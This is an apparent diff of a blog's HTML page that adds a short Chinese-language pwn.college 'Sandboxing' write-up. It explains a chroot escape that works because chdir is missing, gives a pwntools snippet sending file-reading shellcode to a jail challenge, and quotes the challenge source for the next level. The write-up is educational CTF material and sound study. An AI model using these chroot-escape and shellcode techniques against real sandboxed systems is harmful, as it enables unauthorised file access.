@@ -16,16 +16,21 @@
     <meta name="description" content="" />
     
     <title>
-      Tags - Rin
+      Sandboxing - Rin
     </title>
     <link rel="manifest" href="/manifest.json" />
     <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
     
-<link rel="stylesheet" href="../../style/style.css">
+<link rel="stylesheet" href="../../../../style/style.css">
 
   <meta name="generator" content="Hexo 5.4.0"></head>
   <body>
     <canvas id='pagemap'></canvas>
+    
+    <div id="post-toc" class="animated hiddenToc hide">
+      <span class="title">Toc</span>
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Level1"><span class="toc-text">Level1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level2"><span class="toc-text">Level2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level3"><span class="toc-text">Level3</span></a></li></ol>
+    </div>
     
     <div id="fixed-menu-wrap">
       <span class="iconfont icon-sousuo search-box menu-reset"></span>
@@ -56,15 +61,15 @@
       <span class="iconfont icon-close"></span>
       <div class="nav">
         
-        <a href="../../index.html" class="">
+        <a href="../../../../index.html" class="">
           Home
         </a>
         
-        <a href="../../friends" class="">
+        <a href="../../../../friends" class="">
           Friends
         </a>
         
-        <a href="../../about" class="">
+        <a href="../../../../about" class="">
           About
         </a>
         
@@ -98,15 +103,15 @@
 
         <div class="nav">
           
-          <a href="../../index.html" class="">
+          <a href="../../../../index.html" class="">
             Home
           </a>
           
-          <a href="../../friends" class="">
+          <a href="../../../../friends" class="">
             Friends
           </a>
           
-          <a href="../../about" class="">
+          <a href="../../../../about" class="">
             About
           </a>
           
@@ -131,96 +136,103 @@
     </div>
     <div id="container">
       <div class="main animated bounceInRight delay-0.7s">
-        <div id="archives">
-    
-        <div class="title">
-            Tags - pwncollege
-        </div>
-    
-
-
-
-
-    
-    
-    <section class="wrap">
-        <div class="meta">
-            <a href="../../archives/2022" >
-                2022
-            </a>
-        </div>
-        <div class="year">
-            
-            <article class="item">
-            <a href="../../2022/03/03/pwncollege_ProgramMisuse/" title="ProgramMisuse">
-                <span>2022/03/03</span>
-                <span>ProgramMisuse</span>
-            </a>
-            </article>
-            
-
-
-            <article class="item">
-            <a href="../../2022/02/28/Sandboxing/" title="Sandboxing">
-                <span>2022/02/28</span>
-                <span>Sandboxing</span>
-            </a>
-            </article>
-            
-
-
-            <article class="item">
-            <a href="../../2022/02/15/ReverseEngineering/" title="ReverseEngineering">
-                <span>2022/02/15</span>
-                <span>ReverseEngineering</span>
-            </a>
-            </article>
-            
-
-
-            <article class="item">
-            <a href="../../2022/02/14/Debugging%20Refresher/" title="Debugging Refresher">
-                <span>2022/02/14</span>
-                <span>Debugging Refresher</span>
-            </a>
-            </article>
-            
-
-
-            <article class="item">
-            <a href="../../2022/01/29/pwncollege_Assembly_Refresher/" title="Assembly_Refresher">
-                <span>2022/01/29</span>
-                <span>Assembly_Refresher</span>
-            </a>
-            </article>
-            
-
-
-            <article class="item">
-            <a href="../../2022/01/29/Shellcode_Injection/" title="Shellcode_Injection">
-                <span>2022/01/29</span>
-                <span>Shellcode_Injection</span>
-            </a>
-            </article>
-            
-
-
-            <article class="item">
-            <a href="../../2022/01/17/Program_interaction/" title="Program_interaction">
-                <span>2022/01/17</span>
-                <span>Program_interaction</span>
-            </a>
-            </article>
-            
-    
-        </div>
-    </section>
+        <article class="post-entry">
+    <div class="header">
       
-<div class="paginator">
-    <span class="page-number current">1</span>
-</div>
-</div>
+      <div class="title">Sandboxing</div>
+      <div class="meta">
+        <span class="item">
+          <span class="iconfont icon-time-circle"></span>
+          <span>2022/02/28</span>
+        </span>
 
+        
+
+        
+        
+         
+          <span class="item">
+            <span class="iconfont icon-tag1"></span>
+            <span>
+                
+                  
+                    <a href="/tags/pwncollege">pwncollege</a>
+                  
+                
+            </span>
+          </span>
+         
+      </div>
+      <div>
+      </div>
+    </div>
+    <html><head></head><body><h4 id="Level1">Level1<a class="post-anchor" href="#Level1"></a></h4><p>​        首先考察<code>chroot</code></p>
+<p>​        因为程序在将根目录设置为<code>/jail</code>的时候并没有切换当前工作目录为<code>/jail</code>，所以我们实际上还是在<code>/</code>目录，因此可以直接通过<code>argv[1]</code>    读取flag。</p>
+<p>​        执行脚本的时候需要添加<code>cwd</code>参数，使其工作目录为<code>/</code></p>
+<h4 id="Level2">Level2<a class="post-anchor" href="#Level2"></a></h4><pre><code class="python">shellcode = asm(shellcraft.readfile('flag',1))
+p = process(["/challenge/babyjail_level2", "/"],cwd='/')
+p.send(shellcode)
+</code></pre>
+<h4 id="Level3">Level3<a class="post-anchor" href="#Level3"></a></h4><p>​            关键源码：</p>
+<pre><code class="c"> assert(argc &gt; 1);
+
+    puts("Checking to make sure you're not trying to open the flag.\n");
+    assert(strstr(argv[1], "flag") == NULL);
+
+    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
+    if (fd &lt; 0)
+        printf("Failed to open the file located at `%s`.\n", argv[1]);
+    else
+        printf("Successfully opened the file located at `%s`.\n", argv[1]);
+
+    char jail_path[] = "/tmp/jail-XXXXXX";
+    assert(mkdtemp(jail_path) != NULL);
+
+    printf("Creating a jail at `%s`.\n", jail_path);
+
+    assert(chroot(jail_path) == 0);
+
+    puts("Moving the current working directory into the jail.\n");
+    assert(chdir("/") == 0);
+
+    int fffd = open("/flag", O_WRONLY | O_CREAT);
+    write(fffd, "FLAG{FAKE}", 10);
+    close(fffd);
+
+</code></pre>
+</body></html>
+
+  
+  <div class="post-guide">
+    <div class="item left">
+        
+          <a href="../../../03/03/pwncollege_ProgramMisuse/">ProgramMisuse</a>
+        
+    </div>
+    <div class="item right">
+        
+          <a href="../../15/ReverseEngineering/">ReverseEngineering</a>
+        
+    </div>
+  </div>
+
+  
+
+
+  <div id="comment"></div>
+
+  
+  <!-- Highlight.js -->
+
+<link rel="stylesheet"
+href="//highlightjs.org/static/demo/styles/night-owl.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js">
+</script>
+<script>
+hljs.initHighlightingOnLoad();
+
+</script>
+</article>
         <footer>
           <div class="copyright">
             ©2022
